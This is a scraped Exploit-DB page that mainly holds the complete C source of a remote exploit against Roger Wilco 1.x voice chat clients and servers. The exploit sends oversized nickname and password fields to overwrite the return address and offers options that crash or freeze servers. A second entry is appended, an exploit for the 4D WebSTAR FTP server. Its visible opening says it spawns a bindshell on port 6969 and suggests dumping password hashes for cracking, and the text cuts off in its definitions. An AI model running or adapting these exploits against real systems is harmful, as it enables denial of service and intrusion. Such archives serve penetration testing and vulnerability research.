"disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 95
Roger Wilco 1.x - Client Data Buffer Overflow - Multiple remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDRoger Wilco 1.x - Client Data Buffer OverflowEDB-ID:95CVE:2003-0767EDB Verified:Author:Luigi AuriemmaType:remoteExploit:/Platform:MultipleDate:2003-09-10Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*by Luigi AuriemmaUse -DWIN to compile it on WindowsUNIX & WIN VERSION*/#include <stdio.h>#include <stdlib.h>#include <string.h>#ifdef WIN#include <winsock.h>#include "winerr.h"#define close closesocket#else#include <unistd.h>#include <sys/socket.h>#include <sys/types.h>#include <arpa/inet.h>#include <netdb.h>#endif#define VER "0.2"#define PORT 3782#define UDPORT 32230#define BUFFSZ 4096#define TIMEOUT 5#define CHANNEL "channel"/* 516 bytes */#define BOFNICK \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"AAAA" /* EIP *//* 33 bytes */#define BOF2 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"/* 1022 bytes */#define BOF3 \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"AAAA" /* EIP *//* 1268 bytes */#define PWDBOF \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \"AAAA" /* EIP */void rw_manage(int sock, u_char *ptr, int len);void info_udp(char *hostname, u_short port);void timeout(int sock);u_char *create_pck(char *channel, char *password, char *nick, u_short *pcklen);void show_dump(unsigned char *buff, unsigned int buffsz);void showinfostring(unsigned char *buff, int size);u_long resolv(char *host);void std_err(void);u_char bug = 0,next = 0; /* 0 = tag, 1 = size, 2 = data */u_short type = 0,size = 0;int main(int argc, char *argv[]) {u_char *buff = 0,*pcksend = 0,info = 0,autorejoin = 0;char *channel = CHANNEL,*nick = "",*password = 0;struct sockaddr_in peer;int sd,err,i,len;u_short pcklen,port = PORT;setbuf(stdout, NULL);fputs("\n""Testing tool for RogerWilco "VER"\n""by Luigi Auriemma\n""e-mail: aluigi@pivx.com\n""web: http://aluigi.altervista.org\n""\n", stdout);if(argc < 2) {printf("\nUsage: %s [bugs] [options] <host>\n""\nBugs:\n""-1 Remote broadcast BoF in versions 2001 and BoF in 1.4.1.6 (*)\n""-2 DoS to freeze servers, versions 2001 and 1.4.1.6 (*)\n""-3 Server crash in version 1.4.1.6 (*)\n""-4 Buffer-overflow in versions 2001, 1.4.1.2 and 1.4.1.6(*)\n""-5 Server's buffer-overflow versus ALL the graphical clients included\n"" the 1.4.1.6 ver and ALL the dedicated servers included the 0.30a\n"" version. This bug affets EVERY server also if you don't know its\n"" password (you must not set the channel to overwrite the return\n"" address with my default value AAAA)\n""Options:\n""-n NICK Chose your nickname (default invisible mode)\n""-c CHAN Chose the channel to join (default \""CHANNEL"\")\n""-w PASS Chose the password for joining the chat (default none)\n""-p PORT Server port to connect to (default 3782) (default info-port 32230)\n""-a Autorejoin immediately if kicked\n""-i Retrieve info from the remote server using UDP (if not hidden)\n""\n\n""(*) These bugs affect the graphical server (not the dedicated server) and if\n"" the server is dedicated, all the clients connected are vulnerable\n"" This exploit, without using any of these bugs'options, runs like a sniffer\n"" and shows you some useful informations\n""\n", argv[0]);exit(1);}argc--;for(i = 1; i < argc; i++) {switch(argv[i][1]) {case '1':case '2':case '3':case '4':case '5': bug = argv[i][1] - 0x30; break;case 'n': nick = argv[++i]; break;case 'c': channel = argv[++i]; break;case 'w': password = argv[++i]; break;case 'p': port = atoi(argv[++i]); break;case 'a': autorejoin = 1; break;case 'i': info = 1; break;default: {printf("\nError: wrong argument (%s)\n", argv[i]);exit(1);}}}#ifdef WINWSADATA wsadata;WSAStartup(MAKEWORD(1,0), &wsadata);#endifif(info) {if(port == PORT) port = UDPORT;info_udp(argv[argc], port);return(0);}printf("\n""Nickname: %s\n""Channel: %s\n""\n", nick, channel);peer.sin_addr.s_addr = resolv(argv[argc]);peer.sin_port = htons(port);peer.sin_family = AF_INET;buff = malloc(BUFFSZ + 1);if(!buff) std_err();/* AUTOREJOIN */while(1) {sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);if(sd < 0) std_err();printf("\nConnecting to %s:%hu\n",inet_ntoa(peer.sin_addr),htons(peer.sin_port));err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));if(err < 0) std_err();/* BUG 5 */if(bug == 5) password = PWDBOF;pcksend = create_pck(channel, password, nick, &pcklen);err = send(sd, pcksend, pcklen, 0);if(err < 0) std_err();next = 0;while(1) {len = recv(sd, buff, BUFFSZ, 0);if(len < 0) std_err();if(!len) {fputs("\nError: Connection lost\n", stdout);break;}rw_manage(sd, buff, len);}close(sd);if(!autorejoin) break;}return(0);}void rw_manage(int sock, u_char *ptr, int len) {int err;u_long ip;u_short port;while(len > 0) { /* while */switch(next) {/* 0 */ case 0: {type = *(u_short *)ptr;next = 0;switch(type) {case 0x030f: {fputs("You have been kicked out\n", stdout);} break;case 0x060f: {fputs("The channel you want to join doesn't exist!\n", stdout);} break;case 0x070f: {fputs("The channel requires a password or your password is wrong\n", stdout);} break;case 0x140f: {err = send(sock, "\x0f\x14", 2, 0);if(err < 0) std_err();} break;case 0x150f: {err = send(sock, "\x0f\x15", 2, 0);if(err < 0) std_err();} break;default: next = 1; break;}ptr += 2;len -= 2;} break;/* 1 */ case 1: {size = htons(*(u_short *)ptr);next = 2;ptr += 2;len -= 2;} break;/* 2 */ case 2: {switch(type) {case 0x020f: {printf("You have ID %hu\n", htons(*(u_short *)ptr));} break;case 0x0a0f: {printf("User with ID %hu is entered\n", htons(*(u_short *)ptr));} break;case 0x0b0f: {printf("User with ID %hu is exited\n", htons(*(u_short *)ptr));} break;case 0x0c0f: {err = size - 2;printf("User with ID %hu has name: ", htons(*(u_short *)ptr));fwrite(ptr + 2, err, 1, stdout);fputc('\n', stdout);} break;case 0x0d0f:case 0x0e0f: {/* BOH???printf("%hu - %d\n",htons(*(u_short *)ptr), htonl(*(u_long *)(ptr + 2)));*/} break;case 0x0f0f: {ip = *(u_long *)(ptr + 2);port = *(u_short *)(ptr + 6);printf("Address of user with ID %hu is %s:%hu\n",htons(*(u_short *)ptr),inet_ntoa(*(struct in_addr *)&ip),htons(port));} break;default: {printf("--> Undefined type: %04x (hex dump follows)\n", type);show_dump(ptr, size);} break;}next = 0;ptr += size;len -= size;} break;}} /* while */}void info_udp(char *hostname, u_short port) {struct sockaddr_in peer;int sd,err,peerlen;u_char *buff;peer.sin_addr.s_addr = resolv(hostname);peer.sin_port = htons(port);peer.sin_family = AF_INET;peerlen = sizeof(peer);printf("\nRetrieve information from: %s:%d\n\n",inet_ntoa(peer.sin_addr), port);sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);if(sd < 0) std_err();err = sendto(sd, "\\status\\", 8, 0, (struct sockaddr *)&peer, peerlen);if(err < 0) std_err();timeout(sd);buff = malloc(BUFFSZ + 1);if(!buff) std_err();err = recvfrom(sd, buff, BUFFSZ, 0, (struct sockaddr *)&peer, &peerlen);if(err < 0) std_err();buff[err] = 0x00;showinfostring(buff, err);close(sd);free(buff);}u_char *create_pck(char *channel, char *password, char *nick, u_short *pcklen) {static u_char *buff;u_char *ptr;u_short len,tmp,pwlen = 0,chlen,nicklen;buff = malloc(BUFFSZ);if(!buff) std_err();ptr = buff;chlen = strlen(channel) + 1;if(password) pwlen = strlen(password);len = chlen + pwlen + 12;tmp = htons(len);memcpy(ptr, "\x0f\x00", 2);ptr += 2;memcpy(ptr, &tmp, 2);ptr += 2;/* I dunno what the following 12 bytes are, but they work fine */memcpy(ptr, "\x6A\xD6\x4C\x03\x96\xED\x3B\xE7\x88\xE2\xA9\x74", 12);ptr += 12;memcpy(ptr, channel, chlen);ptr += chlen;if(password) {memcpy(ptr, password, pwlen);ptr += pwlen;}memcpy(ptr, "\x0F\x10", 2);ptr += 2;switch(bug) {case 1: nick = BOFNICK; break;case 2: {*pcklen = ptr - buff;return(buff);} break;case 3: nick = BOF2; break;case 4: nick = BOF3; break;default: break;}nicklen = strlen(nick);tmp = htons(nicklen);memcpy(ptr, &tmp, 2);ptr += 2;memcpy(ptr, nick, nicklen);ptr += nicklen;memcpy(ptr,"\x0F\x11""\x00\x04" "\x00\x00\x00\x02""\x0F\x12""\x00\x04" "\x00\x00\x00\x00", 16);*pcklen = ptr - buff + 16;return(buff);}void show_dump(unsigned char *buff, unsigned int buffsz) {const char *hex = "0123456789abcdef";unsigned char buffout[80],*ptrout,*ptr;unsigned int num;int i,j,rest;num = buffsz >> 4; /* 16 caratteri */rest = (buffsz - (num << 4));ptr = buff;for(i = 0; i < num; i++) {ptrout = buffout;for(j = 0; j < 16; j++) {*ptrout++ = hex[*ptr >> 4];*ptrout++ = hex[*ptr & 0xf];*ptrout++ = 0x20;*ptr++;}*ptrout++ = 0x20;*ptrout++ = 0x20;ptr -= 16;for(j = 0; j < 16; j++) {if(*ptr > 0x20) *ptrout = *ptr;else *ptrout = '.';ptr++;ptrout++;}*ptrout++ = 0x0a;*ptrout = 0x00;fputs(buffout, stdout);}if(rest) {ptrout = buffout;for(j = 0; j < rest; j++) {*ptrout++ = hex[*ptr >> 4];*ptrout++ = hex[*ptr & 0xf];*ptrout++ = 0x20;*ptr++;}j = 50 - (ptrout - buffout);memset(ptrout, 0x20, j);ptrout += j;ptr -= rest;for(j = 0; j < rest; j++) {if(*ptr > 0x20) *ptrout = *ptr;else *ptrout = '.';ptr++;ptrout++;}*ptrout++ = 0x0a;*ptrout = 0x00;fputs(buffout, stdout);}}u_long resolv(char *host) {struct hostent *hp;u_long host_ip;host_ip = inet_addr(host);if(host_ip == INADDR_NONE) {hp = gethostbyname(host);if(!hp) {printf("\nError: Unable to resolve hostname (%s)\n",host);exit(1);} else host_ip = *(u_long *)(hp->h_addr);}return(host_ip);}void timeout(int sock) {struct timeval timeout;fd_set fd_read;int err;timeout.tv_sec = TIMEOUT;timeout.tv_usec = 0;FD_ZERO(&fd_read);FD_SET(sock, &fd_read);err = select(sock + 1, &fd_read, NULL, NULL, &timeout);if(err < 0) std_err();if(!err) {fputs("\nError: Socket timeout, no answers received\n", stdout);exit(1);}}void showinfostring(unsigned char *buff, int size) {int nt = 1;// int len;u_char *string;// len = strlen(buff);// if(len < size) buff += len + 1;while(1) {string = strchr(buff, '\\');if(!string) break;*string = 0x00;/* \n or \t */if(!nt) {printf("%s: ", buff);nt++;} else {printf("%s\n", buff);nt = 0;}buff = string + 1;}printf("%s\n\n", buff);}#ifndef WINvoid std_err(void) {perror("\nError");exit(1);}#endif------------------------------ winerr.h ------------------------------/*Header file used for manage errors in WindowsIt support socket and errno too(this header replace the previous sock_errX.h)*/#include <string.h>#include <errno.h>void std_err(void) {char *error;switch(WSAGetLastError()) {case 10004: error = "Interrupted system call"; break;case 10009: error = "Bad file number"; break;case 10013: error = "Permission denied"; break;case 10014: error = "Bad address"; break;case 10022: error = "Invalid argument (not bind)"; break;case 10024: error = "Too many open files"; break;case 10035: error = "Operation would block"; break;case 10036: error = "Operation now in progress"; break;case 10037: error = "Operation already in progress"; break;case 10038: error = "Socket operation on non-socket"; break;case 10039: error = "Destination address required"; break;case 10040: error = "Message too long"; break;case 10041: error = "Protocol wrong type for socket"; break;case 10042: error = "Bad protocol option"; break;case 10043: error = "Protocol not supported"; break;case 10044: error = "Socket type not supported"; break;case 10045: error = "Operation not supported on socket"; break;case 10046: error = "Protocol family not supported"; break;case 10047: error = "Address family not supported by protocol family"; break;case 10048: error = "Address already in use"; break;case 10049: error = "Can't assign requested address"; break;case 10050: error = "Network is down"; break;case 10051: error = "Network is unreachable"; break;case 10052: error = "Net dropped connection or reset"; break;case 10053: error = "Software caused connection abort"; break;case 10054: error = "Connection reset by peer"; break;case 10055: error = "No buffer space available"; break;case 10056: error = "Socket is already connected"; break;case 10057: error = "Socket is not connected"; break;case 10058: error = "Can't send after socket shutdown"; break;case 10059: error = "Too many references, can't splice"; break;case 10060: error = "Connection timed out"; break;case 10061: error = "Connection refused"; break;case 10062: error = "Too many levels of symbolic links"; break;case 10063: error = "File name too long"; break;case 10064: error = "Host is down"; break;case 10065: error = "No Route to Host"; break;case 10066: error = "Directory not empty"; break;case 10067: error = "Too many processes"; break;case 10068: error = "Too many users"; break;case 10069: error = "Disc Quota Exceeded"; break;case 10070: error = "Stale NFS file handle"; break;case 10091: error = "Network SubSystem is unavailable"; break;case 10092: error = "WINSOCK DLL Version out of range"; break;case 10093: error = "Successful WSASTARTUP not yet performed"; break;case 10071: error = "Too many levels of remote in path"; break;case 11001: error = "Host not found"; break;case 11002: error = "Non-Authoritative Host not found"; break;case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;case 11004: error = "Valid name, no data record of requested type"; break;default: error = strerror(errno); break;}fprintf(stderr, "\nError: %s\n", error);exit(1);}CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 96
4D WebSTAR FTP Server Suite - Remote Buffer Overflow - OSX remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED4D WebSTAR FTP Server Suite - Remote Buffer OverflowEDB-ID:96CVE:EDB Verified:Author:B-r00tType:remoteExploit:/Platform:OSXDate:2003-09-11Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Remote Vulnerability in 4D WebSTAR Server Suite - Exploit================================================Date: 11.09.2003Author: B-r00t. 2003.Email: B-r00t blueyonder.co.ukReference: http://www.4d.com/products/webstar.htmlVersions: 4D WebSTAR 5.3.1 (Latest) => VULNERABLE.Tested: 4D WebSTAR 5.3.1 (Trial Version).Exploit: 4DWS_ftp.c - On success a bindshell is spawnedon port 6969. Although the resulting shell isUID 'webstart', it is usually possible toexecute 'nidump passwd .' to obtain the systempassword hashes for cracking.Compile: gcc -o 4DWS_ftp 4DWS_ftp.cDescription: There is a pre authentication buffer overflowthat exists in the login mechanism of the WebSTARFTP service. See advisory for further details.Remember Kiddiez ... An Apple A Day ...!!!!*/#include <stdlib.h>#include <stdio.h>#include <string.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <unistd.h>#include <time.h>#include <netdb.h>// Defines#define EXPLOIT "4DWS_ftp"#define BINDSHELL_PORT 6969#define FTP_PORT 21#define MAXSIZE 1024// 